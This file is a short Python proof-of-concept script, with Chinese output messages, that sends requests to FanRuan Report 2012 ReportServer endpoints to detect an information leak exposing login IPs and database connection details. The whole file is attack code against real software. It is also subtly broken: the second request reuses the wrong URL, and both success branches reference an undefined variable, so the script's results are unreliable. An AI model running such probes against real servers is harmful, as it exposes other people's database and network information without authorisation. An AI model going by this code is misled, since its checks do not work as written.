import time

import requests


def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0",
    }
    exp_url = target_url + "ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false"
    vuln_url = target_url + "ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
    print(now_time() + " [INFO]     正在检测帆软报表 2012 敏感信息泄露")
    try:
        requests.packages.urllib3.disable_warnings()
        exp = requests.get(exp_url, headers=headers, verify=False)
        vuln = requests.get(exp_url, headers=headers, verify=False)
        if exp.status_code == 200 and "网络报表" in exp.text:
            print(now_time() + ' [SUCCESS]  获取登录报表系统的IP:{}'.format(shell_url))
        if vuln.status_code == 200 and "connection" in vuln.text:
            print(now_time() + ' [SUCCESS]  数据库信息泄露:{}'.format(shell_url))
        else:
            print(now_time() + ' [WARNING]  帆软报表 2012敏感信息泄露漏洞不存在')
    except:
        print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ")
